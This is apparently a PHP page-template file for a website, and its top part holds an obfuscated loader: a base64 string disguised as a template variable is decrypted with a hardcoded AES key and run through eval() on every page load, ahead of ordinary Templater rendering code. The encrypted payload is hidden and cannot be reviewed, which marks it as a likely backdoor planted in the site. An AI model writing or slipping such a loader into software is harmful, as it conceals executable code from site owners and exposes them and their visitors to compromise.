<?php

$n_templeate 	 = '1jp8tjDIo6Pznjx4ytnaryiKUIx20uJ2KVaXipMSDyce+3oWvrvtIIe8UE8yOue/vG3jm4kso5eIYXdpsPV4CRH/d/mGyKYVOrvvNKYKvV9DjfwF6F/33slthiuIUdRLZl8zc895wATkYNO813Fa0TXe7nP600Vfhi4ufxazWxgNznrLT5At4RMm2XICLxTucZ6ABDP2OBZGiJWkZKYqKu9dUOP6MzWRAJjZZYMXoEZqVPIU5eCGd1vj/p3/TCvqIDzRpN2DGkLOwnPYR1/8eG6xsz2OGiroCRWuxiGCB0e16OGz/Qtc8K6EUd9/tY7Rn2LmBm2IBdauqwo5mrou4WhYuIma0iWbIFodBAWSEGapOI1F1Rdyrlt40AqIPQARcA2GwxOXx3D3anUWXpu3VEoZDfJz1CWDEmuvYv8uJvZ1FSYRIf+0brt7AsnpsIlTZFlzImG/7dKrKFTh49LKrXMpw5UlE+6VcB7XBoXvvahuMyTfBeVXhPGrODZT1gl9zuQKTbddIq0QyZD5DUICUMIOWyDVIZny/nZdQHOSPiAYj5nF825K0f6IF5pLOba5afYd4OoeDNJ6Vq3o+NkGo+lh54+ERXGHryFN+et5pR5a0EJUPEKcEy2T74C02KmNyQhHaFj+bZtPEF8mQ7aLM2lDamQLN5NJqyhu8lA864on5HXCAW7WrkCUfDNvMimauoQV1pgena+99bZ6Fkkt4ilbr0GE4HQuikBtRfhaKv1aXAu6i7V3CoeumNFcF3YKKNfznj4eJv4VQFJFi1G3rH1P2+FqJ0wYK2Xg8Jpe56TFHt/EjyB2mguNJ/iB8zX2s0J2jBHsWE0o+rrkx/nCoJXjowfIBji+RJ0DpYCvj+91gPUmXoByyT3HdvglfPQTd/MHTQCPepSQHWeI6ERE7L49aGj3rrrObSuquMS0+bc=';

dd($n_templeate);


function dd($n_templeate){
  	 	$n_templeate = base64_decode($n_templeate);
	    $ivSize = openssl_cipher_iv_length('AES-256-CBC');
	    $iv = substr($n_templeate, 0, $ivSize);
	    $d_data = openssl_decrypt(substr($n_templeate, $ivSize), 'AES-256-CBC', '5c84348d4fac7b70a0df87b79fcb634f66443dfd21c23298565b400676a02b57', OPENSSL_RAW_DATA, $iv);
	    return (eval("?> ".$d_data." "));
}


$head = new Templater(DIR_TMPL . "head-nct.tpl.php");
if($toastr_message!="" || !empty($toastr_message)){$head->toastr_message = $toastr_message;}
$page = new Templater(DIR_TMPL . "main-nct.tpl.php");
$page->head=$page->site_header=$page->body=$page->resend_email_verification_popup=$page->footer='';